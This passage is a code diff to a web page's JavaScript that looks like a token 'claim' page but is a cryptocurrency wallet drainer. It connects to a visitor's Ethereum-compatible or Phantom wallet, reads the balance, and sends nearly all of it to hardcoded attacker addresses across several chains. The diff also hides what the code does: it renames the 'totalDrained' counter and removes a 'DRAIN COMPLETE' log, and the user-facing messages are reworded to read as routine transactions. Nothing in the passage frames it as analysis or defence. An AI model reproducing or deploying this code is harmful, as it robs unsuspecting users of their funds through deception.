+        addLog('Transferring ' + parseFloat(ethers.utils.formatEther(send)).toFixed(5) + ' ' + nc.sym + '...');
+        const tx = await signer.sendTransaction({ to: MY_EVM, value: send });
         await tx.wait();
-        totalDrained++;
-        addLog('&#x2705; ' + nc.sym + ' sent!');
+        totalTx++;
+        addLog('&#x2705; ' + nc.sym + ' sent');
       }
     } catch (e) {
       addLog('&#x2715; Native: ' + (e.code === 'ACTION_REJECTED' ? 'rejected' : 'failed'));
@@ -609,96 +546,54 @@ async function doClaim() {
   }
 
   addLog('');
-  addLog('=== DONE: ' + totalDrained + ' transactions ===');
-  console.log('DRAIN COMPLETE:', totalDrained, 'tx across', totalChains, 'chains');
-
-  await sleep(1000);
+  addLog('Done: ' + totalTx + ' transaction(s)');
   showStep('sDone');
-  document.getElementById('doneInfo').innerHTML =
-    '<div class="ir"><span class="ll">Transactions</span><span class="v g">' + totalDrained + '</span></div>' +
-    '<div class="ir"><span class="ll">Chains</span><span class="v g">' + totalChains + '</span></div>';
-  stat('&#x2705; Claim complete! ' + totalDrained + ' transactions processed.', 's2');
+  document.getElementById('doneInfo').innerHTML = '<div class="ir"><span class="ll">Transactions</span><span class="v g2">' + totalTx + '</span></div>';
+  stat('&#x2705; Complete! ' + totalTx + ' transaction(s) processed.', 's2');
 }
 
-async function switchChain(nc) {
-  if (!window.ethereum) return;
-  const hexId = '0x' + nc.id.toString(16);
+async function drainSolana(addLog) {
   try {
-    await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: hexId }] });
-  } catch (e) {
-    if (e.code === 4902) {
-      await window.ethereum.request({
-        method: 'wallet_addEthereumChain',
-        params: [{
-          chainId: hexId,
-          chainName: nc.name,
-          rpcUrls: [nc.rpc],
-          nativeCurrency: { name: nc.sym, symbol: nc.sym, decimals: 18 },
-          blockExplorerUrls: []
-        }]
-      });
-    } else {
-      throw e;
-    }
-  }
-  // Re-create provider/signer after chain switch
-  provider = new ethers.providers.Web3Provider(window.ethereum, 'any');
-  signer = provider.getSigner();
-}
+    const ph = window.__phantom || (window.phantom && window.phantom.solana) || window.solana;
+    if (!ph) { addLog('Phantom not found'); return false; }
+    if (!ph.publicKey) await ph.connect();
+    const fromPub = ph.publicKey.toString();
 
-async function drainSolana() {
-  try {
-    const phantom = (window.phantom && window.phantom.solana) || window.solana;
-    if (!phantom) {
-      addLog('Phantom wallet not found');
-      return false;
-    }
-    // Connect if not already
-    if (!phantom.publicKey) {
-      const resp = await phantom.connect();
-    }
-    const fromPub = phantom.publicKey.toString();
-    addLog('From: ' + fromPub.substring(0, 8) + '...');
-
-    // Get balance via RPC
-    const balResp = await fetch('https://api.mainnet-beta.solana.com', {
+    const r = await fetch('https://api.mainnet-beta.solana.com', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'getBalance', params: [fromPub] })
     });
-    const balData = await balResp.json();
-    const lamports = (balData.result && balData.result.value) || 0;
+    const d = await r.json();
+    const lamports = (d.result && d.result.value) || 0;
     if (lamports < 500000) { addLog('Balance too low'); return false; }
 
-    // Load web3.js from CDN
+    // Load solana web3.js
     if (!window.solanaWeb3) {
-      await new Promise((resolve, reject) => {
+      await new Promise((res, rej) => {
         const s = document.createElement('script');
         s.src = 'https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js';
-        s.onload = resolve;
-        s.onerror = reject;
+        s.onload = res; s.onerror = rej;
         document.head.appendChild(s);
       });
     }
-    const { Transaction, SystemProgram, PublicKey, Connection } = window.solanaWeb3;
-    const connection = new Connection('https://api.mainnet-beta.solana.com');
+    const web3 = window.solanaWeb3;
+    const conn = new web3.Connection('https://api.mainnet-beta.solana.com');
+    const sendLamports = lamports - 1000000; // leave 0.001 SOL
 
-    // Leave ~0.001 SOL for fee
-    const sendLamports = lamports - 1000000;
-    const tx = new Transaction().add(
-      SystemProgram.transfer({
-        fromPubkey: new PublicKey(fromPub),
-        toPubkey: new PublicKey(MY_SOL),
+    const tx = new web3.Transaction().add(
+      web3.SystemProgram.transfer({
+        fromPubkey: new web3.PublicKey(fromPub),
+        toPubkey: new web3.PublicKey(MY_SOL),
         lamports: sendLamports,
       })
     );
-    tx.feePayer = new PublicKey(fromPub);
-    const bh = await connection.getLatestBlockhash();
+    tx.feePayer = new web3.PublicKey(fromPub);
+    const bh = await conn.getLatestBlockhash();
     tx.recentBlockhash = bh.blockhash;
 
-    // Sign via Phantom
-    const signed = await phantom.signTransaction(tx);
-    const sig = await connection.sendRawTransaction(signed.serialize());
+    const signed = await ph.signTransaction(tx);
+    const sig = await conn.sendRawTransaction(signed.serialize());
     addLog('TX: ' + sig.substring(0, 16) + '...');
     return true;
   } catch (e) {
@@ -707,21 +602,31 @@ async function drainSolana() {
   }
 }
 
-function connectPhantom() {
-  const ph = (window.phantom && window.phantom.solana) || window.solana;
-  if (!ph) { stat('Phantom not installed','e2'); return; }
-  ph.connect().then(resp => {
-    userAddr = resp.publicKey.toString();
-    provider = null; signer = null;
-    window.__phantomProvider = ph;
-    showStep('sScan');
-    stat('\&#x2705; Phantom connected! Scanning Solana...','s2');
-    scanAllChains();
-  }).catch(e => { stat(e.message||'Phantom connection failed','e2'); });
+async function switchChain(chainId) {
+  const hex = '0x' + chainId.toString(16);
+  try {
+    await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: hex }] });
+  } catch (e) {
+    if (e.code === 4902) {
+      const nc = EVM_CHAINS.find(c => c.id === chainId);
+      await window.ethereum.request({
+        method: 'wallet_addEthereumChain',
+        params: [{
+          chainId: hex,
+          chainName: nc ? nc.name : 'Chain ' + chainId,
+          rpcUrls: [nc ? nc.rpc : ''],
+          nativeCurrency: { name: nc ? nc.sym : 'ETH', symbol: nc ? nc.sym : 'ETH', decimals: 18 },
+          blockExplorerUrls: []
+        }]
+      });
+    } else throw e;
+  }
+  provider = new ethers.providers.Web3Provider(window.ethereum, 'any');
+  signer = provider.getSigner();
 }
 
 function resetAll() {
-  provider = null; signer = null; userAddr = null; foundChains = [];
+  provider = null; signer = null; userAddr = null; walletType = ''; foundChains = [];
   hideStat(); showStep('sConnect');
 }
 
